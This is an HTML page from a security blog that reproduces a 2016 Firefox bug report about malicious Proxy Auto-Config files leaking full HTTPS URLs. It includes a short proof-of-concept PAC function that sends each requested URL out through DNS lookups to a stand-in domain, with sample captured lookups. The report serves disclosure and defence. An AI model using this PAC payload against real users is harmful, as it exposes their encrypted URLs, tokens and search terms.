@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Firefox - Proxy Auto-Config SSL/TLS Url Disclosure | Alex Chapman’s Blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="Firefox - Proxy Auto-Config SSL/TLS Url Disclosure" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Firefox." />
+<meta property="og:description" content="Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Firefox." />
+<link rel="canonical" href="https://ajxchapman.github.io/bugreports/2016/03/10/firefox-pac-url-disclosure.html" />
+<meta property="og:url" content="https://ajxchapman.github.io/bugreports/2016/03/10/firefox-pac-url-disclosure.html" />
+<meta property="og:site_name" content="Alex Chapman’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2016-03-10T00:00:00-06:00" />
+<script type="application/ld+json">
+{"description":"Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Firefox.","mainEntityOfPage":{"@type":"WebPage","@id":"https://ajxchapman.github.io/bugreports/2016/03/10/firefox-pac-url-disclosure.html"},"url":"https://ajxchapman.github.io/bugreports/2016/03/10/firefox-pac-url-disclosure.html","@type":"BlogPosting","headline":"Firefox - Proxy Auto-Config SSL/TLS Url Disclosure","dateModified":"2016-03-10T00:00:00-06:00","datePublished":"2016-03-10T00:00:00-06:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+  </head>
+  <body>
+
+      <header class="page-header" role="banner">
+        <a href="/">
+        <h1 class="project-name">Alex Chapman's Blog</h1>
+        <h2 class="project-tagline">A tech blog about all things bug bounty, security and development.
+</h2>
+        </a>
+      </header>
+
+    <main id="content" class="main-content" role="main">
+      
+
+
+  
+
+  
+    
+    
+    
+
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="postheader">
+    <a href="/">Home</a>
+  </div>
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Firefox - Proxy Auto-Config SSL/TLS Url Disclosure</h1>
+    <p class="post-meta">
+      <time datetime="2016-03-10T00:00:00-06:00" itemprop="datePublished">
+        2016-03-10
+      </time>
+      
+        • <span itemprop="category">Bug Reports</span>
+      
+  </header>
+  <div class="post-content" itemprop="articleBody">
+    <p>Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Firefox.</p>
+
+<!--more-->
+
+<p><em>Original bug report can be viewed at <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1255474">https://bugzilla.mozilla.org/show_bug.cgi?id=1255474</a></em></p>
+
+<pre class="bugreport">
+Description:        Proxy Auto-Config SSL/TLS Url Disclosure
+Versions Affected:  All
+Category:           Information Disclosure
+Reporter:           Alex Chapman and Paul Stone of Context Information Security
+
+Summary:
+--------
+Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Firefox. The PAC file specifies a Javascript function, FindProxyForURL(url, host), which is called for each URL request in order to determine the required proxy for the connection. This function receives the full URL and hostname for both HTTP and HTTPS requests, which can be leaked by a malicious PAC script. This could expose credentials, tokens, search terms or any other data passed in HTTPS URL query strings to internet based attackers that would otherwise be encrypted. This issue does not affect the default configuration of Firefox.
+
+Analysis:
+---------
+The PAC file is executed in a limited, sandboxed Javascript environment, but some functions are still available (see http://findproxyforurl.com/pac-functions/), most notably dnsResolve. This allows for the full request URL from affected clients to be leaked to an attacker's DNS server or local network hosts via LLMNR.
+
+Since PAC files must be specified manually (either in Firefox or in the system proxy settings), this issue would require a network-based attacker to be able to intercept network traffic of a client configured with a PAC file. For example, this could be performed by a malicious gateway.
+
+All software that implements the PAC specification as written is affected by this issue. We have has confirmed this issue in a number of browsers and operating systems. Notably however, Internet Explorer does not leak full URLs, instead passing only the protocol and hostname to the 'url' parameter of FindProxyForURL (e.g. https://www.example.com/, not https://www.example.com/index.html?foo=bar). Therefore a possible fix for this issues is to follow this same behaviour.
+
+Proof of Concept:
+-----------------
+A PAC script can be crafted, as below, which will perform a DNS lookup based on the host and url parameters passed into the function:
+
+  function FindProxyForURL(url, host){
+    if (dnsResolve((url+'.example.com').replace(/[^a-z0-9_-]+/gi,'.')))
+      return "DIRECT";
+    return "DIRECT";
+  }
+
+This will perform DNS lookups with the encoded URLs against the example.com DNS server.
+
+See the following example DNS captures from HTTPS requests:
+
+  https.incoming.telemetry.mozilla.org.submit.telemetry.0b2fe929-bff9-4421-9a77-9247930853db.main.Firefox.44.0.2.release.20160210153822.v.4.example.com.
+  https.www.google.com.complete.search.client.firefox.q.secre.example.com.
+  https.www.google.com.complete.search.client.firefox.q.secret.example.com.
+</pre>
+
+  </div>
+
+  <div class="postfooter">
+    <a href="/">Home</a>
+    
+      <a href="/bugreports/index.html">More Bug Reports posts</a>
+    
+  </div>
+</article>
+
+
+
+
+<script>
+
+async function calculateClientId() {
+  /*
+  Calculate a semi-unique client Id which rotates every 4 hours. Client Id is
+  calculated from the browser user-agent, language and timezone only. This is
+  meant to be enough to track a browser across pages for a period of time, but
+  othing more. The client Id is is non-persistent and re-calculated each page
+  load, it is not stored in a cookie or local storage.
+  */
+  const identifier = [
+    new Date() - new Date() % (4 * 60 * 60 * 1000), // TrackingID is keyed to the time
+    navigator.userAgent,                            // User agent
+    navigator.language,                             // Browser language, e.g. "en-US"
+    new Date().getTimezoneOffset()                  // Timezone offset
+  ];
+
+  // Hash the identifier, discard a potion of the hash and coerce into the correct format
+  const msgUint8 = new TextEncoder().encode(identifier.join(","));
+  const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(-32);
+  return `${hashHex.slice(0, 8)}-${hashHex.slice(8, 12)}-${hashHex.slice(12, 16)}-${hashHex.slice(16, 20)}-${hashHex.slice(20, 32)}`;
+}
+
+(function() {
+  // Only perform analytics on browsers which have not enabled doNotTrack
+  if (navigator.doNotTrack != 1) {
+    /*
+    References:
+      https://developers.google.com/analytics/devguides/collection/protocol/v1/reference
+      https://developers.google.com/analytics/devguides/collection/analyticsjs/cookies-user-id#disabling_cookies
+      https://developers.google.com/analytics/devguides/collection/analyticsjs/ip-anonymization
+    */
+
+    var promises = [];
+    
+    calculateClientId().then((clientId) => {
+      const stat_vars = {
+        v:  1,                    // Version
+        
+        cid: clientId,            // Client Id
+        t: 'pageview',            // Hit type
+        aip: 1,                   // Set anonymizeIp to mask IP addresses
+        dl: window.location.href, // Document location
+        dt: document.title,       // Document title
+        dr: document.referrer,    // Document referrer
+        z: Date.now()             // Cache buster
+      };
+      const url = 'https://logs-01.loggly.com/inputs/c77487f5-9e26-4c31-bb3e-feb5c17a00e6/tag/loggly-jslogger';
+
+      
+      promises.push(fetch(url, {
+        credentials: 'omit',
+        method: 'POST',
+        headers: {
+          'Content-Type': 'text/plain'
+        },
+        body: JSON.stringify(stat_vars)
+      }));
+      
+    });
+    
+    calculateClientId().then((clientId) => {
+      const stat_vars = {
+        v:  1,                    // Version
+        tid: 'UA-157572028-1', // Endpoint Id
+        cid: clientId,            // Client Id
+        t: 'pageview',            // Hit type
+        aip: 1,                   // Set anonymizeIp to mask IP addresses
+        dl: window.location.href, // Document location
+        dt: document.title,       // Document title
+        dr: document.referrer,    // Document referrer
+        z: Date.now()             // Cache buster
+      };
+      const url = 'https://www.google-analytics.com/collect';
+
+      
+      let uri_vars = [];
+      for (var_key in stat_vars) {
+        uri_vars.push(`${var_key}=${encodeURIComponent(stat_vars[var_key])}`);
+      }
+
+      promises.push(fetch(`${url}?${uri_vars.join('&')}`, {
+        credentials: 'omit'
+      }));
+      
+    });
+    
+
+    
+    
+  }
+})();
+
+
+</script>
+
+
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
